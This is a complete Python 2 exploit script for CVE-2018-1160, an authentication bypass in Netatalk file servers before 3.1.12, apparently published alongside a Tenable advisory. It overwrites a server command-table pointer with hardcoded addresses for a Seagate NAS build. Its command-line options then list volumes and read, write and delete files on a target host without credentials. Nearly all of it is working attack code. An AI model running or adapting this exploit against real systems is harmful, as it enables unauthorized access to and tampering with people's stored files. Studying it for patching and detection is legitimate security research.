##
# Exploit Title: Netatalk Authentication Bypass
# Date: 12/20/2018
# Exploit Author: Jacob Baines
# Vendor Homepage: http://netatalk.sourceforge.net/
# Software Link: https://sourceforge.net/projects/netatalk/files/
# Version: Before 3.1.12
# Tested on: Seagate NAS OS (x86_64)
# CVE : CVE-2018-1160
# Advisory: https://www.tenable.com/security/research/tra-2018-48
##
import argparse
import socket
import struct
import sys

# Known addresses:
# This exploit was written against a Netatalk compiled for an
# x86_64 Seagate NAS. The addresses below will need to be changed
# for a different target.

# preauth_switch_base = '\x60\xb6\x63\x00\x00\x00\x00\x00' # 0x63b6a0
# afp_getsrvrparms = '\x60\xb6\x42\x00\x00\x00\x00\x00' # 0x42b660
# afp_openvol = '\xb0\xb8\x42\x00\x00\x00\x00\x00'  # 42b8b0
# afp_enumerate_ext2 = '\x90\x97\x41\x00\x00\x00\x00\x00' # 419790
# afp_openfork = '\xd0\x29\x42\x00\x00\x00\x00\x00' # 4229d0
# afp_read_ext = '\x30\x3a\x42\x00\x00\x00\x00\x00' # 423a30
# afp_createfile = '\x10\xcf\x41\x00\x00\x00\x00\x00' # 41cf10
# afp_write_ext = '\xb0\x3f\x42\x00\x00\x00\x00\x00' # 423fb0
# afp_delete = '\x20\x06\x42\x00\x00\x00\x00\x00' # 420620

preauth_switch_base = '\x20\x4A\x24\x00\x00\x00\x00\x00' #0x244A20
afp_getsrvrinfo = '\xF0\xD2\x02\x00\x00\x00\x00\x00' #0x2D2F0
afp_getsrvrparms = '\x00\xf8\x02\x00\x00\x00\x00\x00' # 000000000002f800 
afp_openvol = '\xd0\xfa\x02\x00\x00\x00\x00\x00'  # 000000000002fad0 
afp_enumerate_ext2 = '\xa0\xc1\x01\x00\x00\x00\x00\x00' # 000000000001c1a0 
afp_openfork = '\x10\x61\x02\x00\x00\x00\x00\x00' # 0000000000026110 
afp_read_ext = '\x50\x72\x02\x00\x00\x00\x00\x00' # 0000000000027250 
afp_createfile = '\x50\xfe\x01\x00\x00\x00\x00\x00' # 000000000001fe50 
afp_write_ext = '\x00\x78\x02\x00\x00\x00\x00\x00' # 0000000000027800 
afp_delete = '\xe0\x49\x02\x00\x00\x00\x00\x00' # 00000000000249e0 
##
# This is the actual exploit. Overwrites the commands pointer
# with the base of the preauth_switch
##
def do_exploit(sock):
	print "[+] Sending exploit to overwrite preauth_switch data."
	data = '\x00\x04\x00\x01\x00\x00\x00\x00'
	data += '\x00\x00\x00\x1a\x00\x00\x00\x00'
	data += '\x01' # attnquant in open sess
	data += '\x18' # attnquant size
	data += '\xad\xaa\xaa\xba' # overwrites attn_quantum (on purpose)
	data += '\xef\xbe\xad\xde' # overwrites datasize
	data += '\xfe\xca\x1d\xc0' # overwrites server_quantum 
	data += '\xce\xfa\xed\xfe' # overwrites the server id and client id
	data += preauth_switch_base # overwrite the commands ptr
	sock.sendall(data)

	# don't really care about the respone
	resp = sock.recv(1024)
	return


##
# Sends a request to the server.
#
# @param socket the socket we are writing on
# @param request_id two bytes. requests are tracked through the session
# @param address the address that we want to jump to
# @param param_string the params that the address will need
##
def send_request(socket, request_id, address, param_string):
    data = '\x00' # flags
    data += '\x02' # command
    data += request_id
    data += '\x00\x00\x00\x00' # data offset
    data += '\x00\x00\x00\x90' # cmd length <=== always the same
    data += '\x00\x00\x00\x00' # reserved
    # ==== below gets copied into dsi->cmd =====
    data += '\x11' # use the 25th entry in the pre_auth table. We'll write the function to execute there
    data += '\x00' # pad
    if (param_string == False):
        data += ("\x00" * 134)
    else:
        data += param_string
        data += ("\x00" * (134 - len(param_string)))

    data += address # we'll jump to this address

    sock.sendall(data)
    return

##
# Parses the DSI header. If we don't get the expected request id
# then we bail out.
##
def parse_dsi(payload, expected_req_id):
	(flags, command, req_id, error_code, length, reserved) = struct.unpack_from('>BBHIII', payload)
	if command != 8:
		if flags != 1 or command != 2 or req_id != expected_req_id:
			print '[-] Bad DSI Header: %u %u %u' % (flags, command, req_id)
			sys.exit(0)

		if error_code != 0 and error_code != 4294962287:
			print '[-] The server responded to with an error code: ' + str(error_code)
			sys.exit(0)

	afp_data = payload[16:]
	if len(afp_data) != length:
		if command != 8:
			print '[-] Invalid length in DSI header: ' + str(length) + ' vs. ' + str(len(payload))
			sys.exit(0)
		else:
			afp_data = afp_data[length:]
			afp_data = parse_dsi(afp_data, expected_req_id)

	return afp_data

##
# List all the volumes on the remote server
##
def list_volumes(sock):
	print "[+] Listing volumes"
	send_request(sock, "\x00\x01", afp_getsrvrparms, "")
	resp = sock.recv(1024)

	afp_data = parse_dsi(resp, 1)
	(server_time, volumes) = struct.unpack_from('>IB', afp_data)
	print "[+] " + str(volumes) + " volumes are available:"

	afp_data = afp_data[5:]
	for i in range(volumes):
		string_length = struct.unpack_from('>h', afp_data)
		name = afp_data[2 : 2 + string_length[0]]
		print "\t-> " + name
		afp_data = afp_data[2 + string_length[0]:]

	return

##
# Open a volume on the remote server
##
def open_volume(sock, request, params):
	send_request(sock, request, afp_openvol, params)
	resp = sock.recv(1024)

	afp_data = parse_dsi(resp, 1)
	(bitmap, vid) = struct.unpack_from('>HH', afp_data)
	return vid

##
# List the contents of a specific volume
##
def list_volume_content(sock, name):
	print "[+] Listing files in volume " + name

	# open the volume
	length = struct.pack("b", len(name))
	vid = open_volume(sock, "\x00\x01", "\x00\x20" + length + name)
	print "[+] Volume ID is " + str(vid)

	# enumerate
	packed_vid = struct.pack(">h", vid)
	send_request(sock, "\x00\x02", afp_enumerate_ext2, packed_vid + "\x00\x00\x00\x02\x01\x40\x01\x40\x07\xff\x00\x00\x00\x01\x7f\xff\xff\xff\x02\x00\x00\x00")
	resp = sock.recv(1024)

	afp_data = parse_dsi(resp, 2)
	(f_bitmap, d_bitmap, req_count) = struct.unpack_from('>HHH', afp_data)
	afp_data = afp_data[6:]

	print "[+] Files (%u):" % req_count
	for i in range(req_count):
		(length, is_dir, pad, something, file_id, name_length) = struct.unpack_from('>HBBHIB', afp_data)
		name = afp_data[11:11+name_length]
		if is_dir:
			print "\t[%u] %s/" % (file_id, name)
		else:
			print "\t[%u] %s" % (file_id, name)
		afp_data = afp_data[length:]

##
# Read the contents of a specific file.
##
def cat_file(sock, vol_name, file_name):
	print "[+] Cat file %s in volume %s" % (file_name, vol_name)

	# open the volume
	vol_length = struct.pack("b", len(vol_name))
	vid = open_volume(sock, "\x00\x01", "\x00\x20" + vol_length + vol_name)
	print "[+] Volume ID is " + str(vid)

	# open fork
	packed_vid = struct.pack(">h", vid)
	file_length = struct.pack("b", len(file_name))
	send_request(sock, "\x00\x02", afp_openfork, packed_vid + "\x00\x00\x00\x02\x00\x00\x00\x03\x02" + file_length + file_name)
	resp = sock.recv(1024)

	afp_data = parse_dsi(resp, 2)
	(f_bitmap, fork_id) = struct.unpack_from('>HH', afp_data)
	print "[+] Fork ID: %s" % (fork_id)

	# read file
	packed_fork = struct.pack(">h", fork_id)
	send_request(sock, "\x00\x03", afp_read_ext, packed_fork + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + "\x00\x00\x03\x00")
	resp = sock.recv(1024)

	afp_data = parse_dsi(resp, 3)
	print "[+] File contents:"
	print afp_data

##
# Create a file on the remote volume
## 
def write_file(sock, vol_name, file_name, data):
	print "[+] Writing to %s in volume %s" % (file_name, vol_name)

	# open the volume
	vol_length = struct.pack("B", len(vol_name))
	vid = open_volume(sock, "\x00\x01", "\x00\x20" + vol_length + vol_name)
	print "[+] Volume ID is " + str(vid)

	# create the file
	packed_vid = struct.pack(">H", vid)
	file_length = struct.pack("B", len(file_name))
	send_request(sock, "\x00\x02", afp_createfile, packed_vid + "\x00\x00\x00\x02\x02" + file_length + file_name);
	resp = sock.recv(1024)
	afp_data = parse_dsi(resp, 2)

	if len(afp_data) != 0:
		sock.recv(1024)

	# open fork
	packed_vid = struct.pack(">H", vid)
	file_length = struct.pack("B", len(file_name))
	send_request(sock, "\x00\x03", afp_openfork, packed_vid + "\x00\x00\x00\x02\x00\x00\x00\x03\x02" + file_length + file_name)
	resp = sock.recv(1024)

	afp_data = parse_dsi(resp, 3)
	(f_bitmap, fork_id) = struct.unpack_from('>HH', afp_data)
	print "[+] Fork ID: %s" % (fork_id)

	# write
	packed_fork = struct.pack(">H", fork_id)
	data_length = struct.pack(">Q", len(data))
	send_request(sock, "\x00\x04", afp_write_ext, packed_fork + "\x00\x00\x00\x00" + "\x00\x00\x00\x00" + data_length + data)
	#resp = sock.recv(1024)

	sock.send(data + ("\x0a"*(144 - len(data))))
	resp = sock.recv(1024)
	afp_data = parse_dsi(resp, 4)
	print "[+] Fin"

##
# Delete a file on the remote volume
##
def delete_file(sock, vol_name, file_name):
	print "[+] Deleting %s from volume %s" % (file_name, vol_name)

	# open the volume
	vol_length = struct.pack("B", len(vol_name))
	vid = open_volume(sock, "\x00\x01", "\x00\x20" + vol_length + vol_name)
	print "[+] Volume ID is " + str(vid)

	# delete the file
	packed_vid = struct.pack(">H", vid)
	file_length = struct.pack("B", len(file_name))
	send_request(sock, "\x00\x02", afp_delete, packed_vid + "\x00\x00\x00\x02\x02" + file_length + file_name);
	resp = sock.recv(1024)
	afp_data = parse_dsi(resp, 2)

	print "[+] Fin"

##
##
## Main
##
##

top_parser = argparse.ArgumentParser(description='I\'m a little pea. I love the sky and the trees.')
top_parser.add_argument('-i', '--ip', action="store", dest="ip", required=True, help="The IPv4 address to connect to")
top_parser.add_argument('-p', '--port', action="store", dest="port", type=int, help="The port to connect to", default="548")
top_parser.add_argument('-lv', '--list-volumes', action="store_true", dest="lv", help="List the volumes on the remote target.")
top_parser.add_argument('-lvc', '--list-volume-content', action="store_true", dest="lvc", help="List the content of a volume.")
top_parser.add_argument('-c', '--cat', action="store_true", dest="cat", help="Dump contents of a file.")
top_parser.add_argument('-w', '--write', action="store_true", dest="write", help="Write to a new file.")
top_parser.add_argument('-f', '--file', action="store", dest="file", help="The file to operate on")
top_parser.add_argument('-v', '--volume', action="store", dest="volume", help="The volume to operate on")
top_parser.add_argument('-d', '--data', action="store", dest="data", help="The data to write to the file")
top_parser.add_argument('-df', '--delete-file', action="store_true", dest="delete_file", help="Delete a file")
args = top_parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Attempting connection to " + args.ip + ":" + str(args.port)
sock.connect((args.ip, args.port))
print "[+] Connected!"

do_exploit(sock)
if args.lv:
	list_volumes(sock)
elif args.lvc and args.volume != None:
	list_volume_content(sock, args.volume)
elif args.cat and args.file != None and args.volume != None:
	cat_file(sock, args.volume, args.file)
elif args.write and args.volume != None and args.file != None and args.data != None:
	if len(args.data) > 144:
		print "This implementation has a max file writing size of 144"
		sys.exit(0)
	write_file(sock, args.volume, args.file, args.data)
elif args.delete_file and args.volume != None and args.file != None:
	delete_file(sock, args.volume, args.file)
else:
	print("Bad args")

sock.close()